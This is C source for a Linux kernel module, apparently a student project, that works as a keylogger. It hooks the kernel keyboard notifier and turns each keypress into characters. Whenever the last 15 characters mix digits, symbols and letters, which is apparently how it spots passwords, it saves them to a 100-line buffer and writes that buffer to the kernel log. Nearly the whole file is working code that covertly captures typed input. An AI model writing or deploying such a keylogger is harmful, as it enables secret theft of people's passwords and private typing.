//Tyler Drover, Project 3:Kernel Module Keylogger

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/interrupt.h>
#include <linux/proc_fs.h>
#include <linux/sched.h>
#include <linux/keyboard.h>
#include <asm/uaccess.h>
#include <asm/io.h>
#include <linux/slab.h>

#define PROC_FILE_NAME "project3file"
char *arr[15]={'\0','\0','\0','\0','\0','\0','\0','\0','\0','\0','\0','\0','\0','\0','\0'};
char *cpy[15]={"t ","t ","t ","t ","t ","t ","t ","t ","t ","t ","t ","t ","t ","t ","t "};
int i=0;
int j=0;
char str[100][16]={};

struct notifier_block nb;
ssize_t read_simple(struct file *filp,char *buf,size_t count,loff_t *offp ) 
{
	
	return 0;
}

struct proc_ops proc_fops = {
	proc_read: read_simple,
};

int kb_notifier_fn(struct notifier_block *nb, unsigned long action, void* data){
	struct keyboard_notifier_param *kp = (struct keyboard_notifier_param*)data;
	char *lower[55]={"\0","\0","1","2","3","4","5","6","7","8","9","0","-","=","\0",
	"\0","q","w","e","r","t","y","u","i","o","p","[","]","\0","\0","a","s","d","f","g","h",
	"j","k","l",";","'","`","\0","\0","z","x","c","v","b","n","m",",",".","/"};
	
	char *upper[55]={"\0","\0","!","@","#","$","%","^","&","*","(",")","_","+","\0",
	"\0","Q","W","E","R","T","Y","U","I","O","P","{","}","\0","\0","A","S","D","F","G","H",
	"J","K","L",":","\"","~","\0","\0","Z","X","C","V","B","N","M","<",">","?"};
	
	int c1=0;
	int c2=0;
	int c3=0;
	int c4=0;
	int k=0;
	int check=0;
	char temp[100][15]={};
	
	//printk("Key:  %d  Lights:  %d  Shiftmax:  %x\n", kp->value, kp->ledstate, kp->shift);
	int x=kp->value;
	if(x==0||x==1||x==14||x==15||x==28||x==29||x==42||x==43||kp->down==0){
		;
	}
	else{
		if(0<kp->value && kp->value<=54 && kp->shift==0)
		{
			for(i=1;i<15;i++)
				arr[i-1]=arr[i];			
			arr[14]=lower[kp->value];	
		}
		else if(0<kp->value && kp->value<=54 && kp->shift==1)
		{
			for(i=1;i<15;i++)
				arr[i-1]=arr[i];
			arr[14]=upper[kp->value];
		}
		
	for(i=0;i<15;i++){
		if((arr[i]==lower[2]||arr[i]==lower[3]||arr[i]==lower[4]||arr[i]==lower[5]||
		    arr[i]==lower[6]||arr[i]==lower[7]||arr[i]==lower[8]||arr[i]==lower[9]||
		    arr[i]==lower[10]||arr[i]==lower[11])&&c1 !=1){
			check+=1;
			c1=1;
		}
		if((arr[i]==lower[12]||arr[i]==lower[13]||arr[i]==lower[26]||arr[i]==lower[27]||			    arr[i]==lower[39]||arr[i]==lower[40]||arr[i]==lower[41]||arr[i]==lower[51]||
		    arr[i]==lower[52]||arr[i]==lower[53]||arr[i]==upper[2]||arr[i]==upper[3]||
		    arr[i]==upper[4]||arr[i]==upper[5]||arr[i]==upper[6]||arr[i]==upper[7]||				    arr[i]==upper[8]||arr[i]==upper[9]||arr[i]==upper[10]||arr[i]==upper[11]||
		    arr[i]==upper[12]||arr[i]==upper[13]||arr[i]==upper[26]||arr[i]==upper[27]||			    arr[i]==upper[39]||arr[i]==upper[40]||arr[i]==upper[41]||arr[i]==upper[51]||			    arr[i]==upper[52]||arr[i]==upper[53])&&c2 !=1){
			check+=1;
			c2=1;
		}
		if((arr[i]==lower[16]||arr[i]==lower[17]||arr[i]==lower[18]||arr[i]==lower[19]||			    arr[i]==lower[20]||arr[i]==lower[21]||arr[i]==lower[22]||arr[i]==lower[23]||
		    arr[i]==lower[24]||arr[i]==lower[25]||arr[i]==lower[30]||arr[i]==lower[31]||
		    arr[i]==lower[32]||arr[i]==lower[33]||arr[i]==lower[34]||arr[i]==lower[35]||			    arr[i]==lower[36]||arr[i]==lower[37]||arr[i]==lower[38]||arr[i]==lower[44]||
		    arr[i]==lower[45]||arr[i]==lower[46]||arr[i]==lower[47]||arr[i]==lower[48]||			    arr[i]==lower[49]||arr[i]==lower[50])&&c3 !=1){
		    	check+=1;
			c3=1;
		}
		if((arr[i]==upper[16]||arr[i]==upper[17]||arr[i]==upper[18]||arr[i]==upper[19]||			    arr[i]==upper[20]||arr[i]==upper[21]||arr[i]==upper[22]||arr[i]==upper[23]||
		    arr[i]==upper[24]||arr[i]==upper[25]||arr[i]==upper[30]||arr[i]==upper[31]||
		    arr[i]==upper[32]||arr[i]==upper[33]||arr[i]==upper[34]||arr[i]==upper[35]||			    arr[i]==upper[36]||arr[i]==upper[37]||arr[i]==upper[38]||arr[i]==upper[44]||
		    arr[i]==upper[45]||arr[i]==upper[46]||arr[i]==upper[47]||arr[i]==upper[48]||			    arr[i]==upper[49]||arr[i]==upper[50])&&c4 !=1){
		    	check+=1;
			c4=1;
		}
		if(check>=3){
			if(arr[0]==cpy[0] && arr[1]==cpy[1] && arr[2]==cpy[2] && arr[3]==cpy[3] &&      			   arr[4]==cpy[4] && arr[5]==cpy[5] && arr[6]==cpy[6] && arr[7]==cpy[7] &&      			   arr[8]==cpy[8] && arr[9]==cpy[9] && arr[10]==cpy[10] && arr[11]==cpy[11] &&
			   arr[12]==cpy[12] && arr[13]==cpy[13] && arr[14]==cpy[14]){
				;
			}
			else{
			for(i=0;i<15;i++){
				cpy[i]=arr[i];
	//			printk("%s",arr[i]);
				if(arr[i]=='\0')
					arr[i]="";
			}
			for(i=0;i<15;i++)
				strncat(temp[0],arr[i],1);

			for(j=1;j<100;j++){
				snprintf(str[j-1],sizeof(str[j-1]),"%s",str[j]);
		//	printk("String at: %i %s",j,str[j]);
			}
			snprintf(str[99],sizeof(str[99]),"%s",temp[0]);	
			snprintf(temp[0],sizeof(temp[0]),"%s","\0");
			
				
			for(i=0;i<100;i++){
				printk("String: %i %s",i,str[i]);
			}
			printk("%s","----------------------");
			check=0;
			c1=0;
			c2=0;
			c3=0;
			c4=0;
			k=0;

			}

		}

	}
	
	}
	return 0;
}

int init (void) {
	nb.notifier_call = kb_notifier_fn;
	register_keyboard_notifier(&nb);
	proc_create(PROC_FILE_NAME,0644,NULL,&proc_fops);
	return 0;
}

void cleanup(void) {
	unregister_keyboard_notifier(&nb);
	remove_proc_entry(PROC_FILE_NAME,NULL);
}

MODULE_LICENSE("GPL"); 
module_init(init);
module_exit(cleanup);

























